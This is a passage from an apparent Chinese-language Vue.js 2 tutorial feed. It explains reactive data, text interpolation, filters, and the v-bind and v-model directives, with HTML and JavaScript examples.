<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hobbies</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;唱歌&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">$set</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hobbies</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;跳舞&#39;</span><span class="p">)</span>
</span></span></code></pre></div><hr>
<h1 id="vue-数据监听总结" data-numberify>Vue 数据监听总结<a class="anchor ms-1" href="#vue-数据监听总结"></a></h1>
<p>Vue会监听<code>data</code>中所有层次的数据。</p>
<ul>
<li>
<p>监听对象中数据的方式：</p>
<p>通过Setter实现监听，且要在<code>new Vue()</code>时就传入要监测的数据。</p>
<p>在Vue监听对象中需要注意：</p>
<ul>
<li>
<p>对象中后追加的属性，Vue默认不做响应式处理。</p>
</li>
<li>
<p>如需给后添加的属性做响应式，请使用如下API：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">propertyName</span><span class="o">|</span><span class="nx">index</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">$set</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">propertyName</span><span class="o">|</span><span class="nx">index</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span></code></pre></div></li>
</ul>
</li>
<li>
<p>监听数组中数据的方式：</p>
<p>通过包裹数组更新元素的7个方法实现，本质就是做了两件事：</p>
<ol>
<li>调用原生（<code>Array.prototype</code>）对应的方法对数组进行更新。</li>
<li>重新解析模板，进而更新页面。</li>
</ol>
<p>在Vue修改数组中的某个元素一定要用如下方法：</p>
<ul>
<li>
<p>使用以下API：</p>
<ul>
<li><code>array.push()</code></li>
<li><code>array.pop()</code></li>
<li><code>array.shift()</code></li>
<li><code>array.unshift()</code></li>
<li><code>array.splice()</code></li>
<li><code>array.sort()</code></li>
<li><code>array.reverse()</code></li>
</ul>
</li>
<li>
<p>使用<code>Vue.set()</code>或<code>vm.$set()</code></p>
<blockquote>
<p>注：<code>Vue.set()</code>和<code>vm.$set()</code>不能给<code>vm</code>或<code>vm</code>的根数据对象添加属性。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 插值语法</title>
      <link>/docs/vue/single-instance/template-syntax/interpolation/</link>
      <pubDate>Sat, 19 Aug 2023 10:36:30 +0000</pubDate>
      
      <guid>/docs/vue/single-instance/template-syntax/interpolation/</guid>
      <description><![CDATA[文本插值 数据绑定最常见的形式就是文本插值。 在HTML标签体中，使用两个花括号{{ }}将JS表达式引起来。文本插值含义是将JS表达式的结果作为]]></description>
      <content:encoded><![CDATA[<h1 id="文本插值" data-numberify>文本插值<a class="anchor ms-1" href="#文本插值"></a></h1>
<p>数据绑定最常见的形式就是<strong>文本插值</strong>。</p>
<p>在HTML标签体中，使用两个花括号<code>{{ }}</code>将JS表达式引起来。文本插值含义是将JS表达式的结果作为文本显示到页面中；并不是指JS表达式的结果为文本。</p>
<p>插值表达式的语法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">{{expression}}
</span></span></code></pre></div><p>其中，<code>expression</code>将作为JS表达式去解析并执行。示例如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, {{name}}<span class="c">&lt;!-- 插值表达式 --&gt;</span>!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Vue.js&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>因为文本插值使用的是JS表达式，所以在<code>{{ }}</code>中，也可以写入<code>1+1</code>这类常量表达式，也可以调用方法（例如<code>name.toUpperCase()</code>），还可以使用<code>size+1</code>等表达式。</p>
<p>实际上，插值表达式中可以使用的对象不仅仅是<code>data</code>中的对象，所有Vue实例中的属性、原型中属性的它都能使用。因为<code>data</code>中的对象在Vue实例化后，是作为Vue实例的属性所存在。</p>
<hr>
<h1 id="过滤器" data-numberify>过滤器<a class="anchor ms-1" href="#过滤器"></a></h1>
<p>Vue允许自定义过滤器，被用作一些常见的文本格式化。过滤器由“管道符”<code>|</code>指示，并且过滤器可以串联，其格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 元素插值中 --&gt;</span>
</span></span><span class="line"><span class="cl">{{ expression | filter1[ | filter2[ | ... ]] }}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- v-bind 指令中 --&gt;</span>
</span></span><span class="line"><span class="cl">v-bind:attribute=&#34;expression | filter1[ | filter2[ | ... ]]&#34;
</span></span></code></pre></div><p>使用过滤器时，<code>|</code>左边表达式的值（或输出）将会作为<code>|</code>右边过滤器的（第1个参数的）输入。</p>
<p>过滤器一般是在Vue实例配置中的<code>filters</code>中以函数的形式定义。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ message | capitalize }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;hello vue.js!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">filters</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">capitalize</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">value</span><span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">+</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>如果过滤器的定义中，拥有两个或两个以上的参数，那么在使用过滤器时，<code>|</code>左边的表达式的值将会作为其右边过滤器的第1个参数进行输入，例如：</p>
<pre tabindex="0"><code>{{ message | filter(arg1, arg2) }}
</code></pre><p><code>arg1</code>作为<code>filter()</code>的第2个参数输入，<code>arg2</code>作为<code>filter()</code>的第3个参数输入，而<code>message</code>将作为<code>filter()</code>的第1个参数进行输入。</p>
<blockquote>
<p>注：</p>
<ol>
<li>过滤器在定义时，一定至少要定义有一个参数<code>value</code>，因为过滤器始终会将管道符<code>|</code>左边的表达式的结果作为参数1<code>value</code>传入。如果不定义参数<code>value</code>，那么过滤器将显得无意义。</li>
<li>过滤器不能在<code>v-model</code>指令中使用。</li>
<li>一般的过滤器不会改变原本的数据。</li>
</ol>
</blockquote>
<p>在Vue实例中配置的<code>filters</code>只能在当前Vue实例中使用，这种过滤器被称为局部过滤器。当应用中存在多个Vue实例时，可以使用全局过滤器。全局过滤器使用<code>Vue.filter()</code>来注册。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;capitalize&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">value</span><span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">+</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p><code>Vue.filter()</code>有两个参数，它们的作用分别是：</p>
<ol>
<li>参数1：定义过滤器的名称。</li>
<li>参数2：定义过滤器的方法。</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 模板语法</title>
      <link>/docs/vue/single-instance/template-syntax/introduction/</link>
      <pubDate>Sat, 19 Aug 2023 10:36:30 +0000</pubDate>
      
      <guid>/docs/vue/single-instance/template-syntax/introduction/</guid>
      <description><![CDATA[Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。结合响应系统，在应用状态改变时， Vue 能够智能地计算出重新渲染组件的最小]]></description>
      <content:encoded><![CDATA[<p>Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。结合响应系统，在应用状态改变时， Vue 能够智能地计算出重新渲染组件的最小代价并应用到 DOM 操作上。</p>
<p>Vue中模板语法有以下两种类型：</p>
<ul>
<li>
<p>插值语法：用<code>{{}}</code>包裹起来的表达式。</p>
<p>Vue插值语法中，可以指定JS表达式将数据与模板进行绑定。</p>
<p>与语句不同的是，插值表达式指可以生成值的语句，这个语句可以放在任何需要值的地方。也就是说插值表达式一定需要有值（或返回值）。表达式中的变量、方法都是在对应Vue实例的 <code>data</code> 中定义的。当<code>data</code>发生了改变，页面中对应的数据也会发生改变（动态）。</p>
</li>
<li>
<p>指令语法：以<code>v-</code>为开头的Vue指令。</p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 指令语法</title>
      <link>/docs/vue/single-instance/template-syntax/directives/</link>
      <pubDate>Sat, 19 Aug 2023 10:36:30 +0000</pubDate>
      
      <guid>/docs/vue/single-instance/template-syntax/directives/</guid>
      <description><![CDATA[指令是指在Vue模板中由Vue原型对象或用户自定义的、带有v-前缀的特殊HTML属性。指令可以用于解析标签（包括标签属性、标签内容、绑定事件]]></description>
      <content:encoded><![CDATA[<p>指令是指在Vue模板中由Vue原型对象或用户自定义的、带有<code>v-</code>前缀的特殊HTML属性。指令可以用于解析标签（包括标签属性、标签内容、绑定事件等等）。</p>
<hr>
<h1 id="数据绑定" data-numberify>数据绑定<a class="anchor ms-1" href="#数据绑定"></a></h1>
<h2 id="单向数据绑定" data-numberify>单向数据绑定<a class="anchor ms-1" href="#单向数据绑定"></a></h2>
<p><code>v-bind</code>单向数据绑定：单向绑定是指数据只能从Vue实例中的<code>data</code>流向页面内容。</p>
<p>将<code>v-bind:</code>置于要使用表达式的HTML属性前，Vue会将其属性值解析为表达式。<code>v-bind</code>的语法规则如下：</p>
<pre tabindex="0"><code>v-bind:attribute=&#34;expression&#34;
</code></pre><ul>
<li><code>attribute</code>：<code>v-bind</code>指令的参数，<code>v-bind</code>指令的参数是HTML属性。</li>
<li><code>expression</code>：表达式中的对象和方法等均来自Vue实例。</li>
</ul>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">v-bind:href</span><span class="o">=</span><span class="s">&#34;vueUrl&#34;</span><span class="p">&gt;</span>Vue官网<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span><span class="c">&lt;!-- v-bind:插值表达式 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">vueUrl</span><span class="o">:</span> <span class="s1">&#39;https://cn.vuejs.org/&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-bind:</code>可以简写为<code>:</code>，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">:href</span><span class="o">=</span><span class="s">&#34;vueUrl&#34;</span><span class="p">&gt;</span>Vue官网<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="双向数据绑定" data-numberify>双向数据绑定<a class="anchor ms-1" href="#双向数据绑定"></a></h2>
<p><code>v-model</code>双向数据绑定：双向数据绑定指数据不单能从Vue示例的<code>data</code>中流向页面，还能从页面流向<code>data</code>。</p>
<p><code>v-model</code>的用法与<code>v-bind</code>十分类似，将<code>v-model:</code>置于要使用表达式的HTML属性前。<code>v-model</code>的语法规则如下：</p>
<pre tabindex="0"><code>v-model:value=&#34;expression&#34;
</code></pre><ul>
<li>
<p><code>value</code>：<code>v-model</code>的参数只能是<code>&lt;input&gt;</code>标签的<code>value</code>属性。</p>
<p>由于<code>v-model</code>仅作用于<code>value</code>元素上，所以<code>v-model:value</code>可以简写为<code>v-model</code>。简写形式如下：</p>
<pre tabindex="0"><code>v-model=&#34;expression&#34;
</code></pre></li>
<li>
<p><code>expression</code>：同<code>v-bind</code>指令，表达式中的对象和方法等均来自Vue实例。</p>
</li>
</ul>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  单向数据绑定：修改该输入框，Vue中的数据并不会被改变。
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">:value</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  双向数据绑定：修改该输入框，Vue中的数据将会被改变（上方输入框也会随着数据的改变而改变）。
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model:value</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  v-model 简写形式：
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Linner&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>注：</p>
<p><code>v-model</code>指令只能用于<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;checkbox&gt;</code>、<code>&lt;radio&gt;</code>等表单控件元素上创建双向数据绑定，根据表单上的值，自动更新绑定的元素的值。</p>
<p>因为<code>v-model</code>双向绑定是为了能于用户的输入进行交互，所以<code>v-model</code>作用于不能由用户改变值的元素上是无意义的。</p>
</blockquote>
<h3 id="v-model-修饰符" data-numberify>v-model 修饰符<a class="anchor ms-1" href="#v-model-修饰符"></a></h3>
<p><code>v-model</code>常用的修饰符有：</p>
<ul>
<li>
<p><code>.lazy</code>：<code>v-model</code>默认在<code>input</code>事件中同步输入框的值与数据。使用<code>.lazy</code>修饰符可以<u>让<code>v-model</code>在<code>change</code>事件中同步</u>。</p>
<p>在<code>change</code>事件中同步指的是输入完成后再进行同步。例如在<code>type=&quot;text&quot;</code>的输入框中使用<code>.lazy</code>修饰符时，只有在按下回车键或者鼠标点击输入框外的其它地方时才会进行同步。</p>
</li>
<li>
<p><code>.number</code>：在<code>type=&quot;number&quot;</code>时Html中输入的值也总是会返回字符串类型。使用<code>.number</code>修饰符可以<u>自动将用户的输入值转为Number类型</u>（如果原值的转换结果为NaN则返回原值）。</p>
</li>
<li>
<p><code>.trim</code>：自动过滤（去除）用户输入的首尾空格。</p>
</li>
</ul>
<h3 id="收集表单数据" data-numberify>收集表单数据<a class="anchor ms-1" href="#收集表单数据"></a></h3>
<p>为复选框进行双向绑定：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>ID<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;preson in presons&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;preson.id&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">:value</span><span class="o">=</span><span class="s">&#34;preson&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;checkedPersons&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.id}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{preson.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;checkedPersons.length &gt; 0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    选择的元素有：
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;preson in checkedPersons&#34;</span><span class="p">&gt;</span>{{preson.name}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">presons</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;001&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;002&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">19</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;003&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;王五&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">17</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">],</span>
</span></span><span class="line"><span class="cl">      <span class="nx">checkedPersons</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>为单选框进行双向绑定：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Vue.js 好不好用？<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;good&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;好用！&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;result&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;good&#34;</span><span class="p">&gt;</span>好用！<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;notGood&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;不好用？&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;result&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;notGood&#34;</span><span class="p">&gt;</span>不好用？<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
